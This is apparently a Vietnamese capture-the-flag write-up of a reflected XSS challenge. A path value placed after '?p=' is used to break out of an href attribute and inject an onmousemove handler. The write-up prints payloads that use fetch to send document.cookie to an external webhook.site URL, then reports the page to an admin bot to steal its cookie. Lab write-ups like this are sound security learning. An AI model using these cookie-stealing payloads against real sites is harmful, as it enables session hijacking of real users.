Challenge: 

Sau khi truy cập trang web: \
![alt text](image.png)

Test thử 1 vài chức năng, sau đó thử 1 đoạn url ko có sẵn nó sẽ báo lỗi:
![alt text](image-1.png)

Xem thử source code
![alt text](image-2.png)

ta thấy đoạn path được thêm vào sau `?p=`, ta sẽ thử thoát khỏi thuộc tính href bằng chèn thêm `'`: `' onmousemove='alert(1)`

Kết quả khi ta đưa chuột qua: \
![alt text](image-3.png)

Đến đây ta biết đã có thể XSS, tạo payload để gửi gói tin qua webhook: \
`' onmousemove='fetch("https://webhook.site/1b6e1612-f794-41d6-83a8-8bf67316dbec")`\
![alt text](image-4.png)

Tạo payload để lấy cookie: \
`' onmousemove='fetch("https://webhook.site/1b6e1612-f794-41d6-83a8-8bf67316dbec?c=".concat(document.cookie))`
![alt text](image-5.png)

Bây giờ report cho admin và đợi kết quả: 
![alt text](image-6.png)
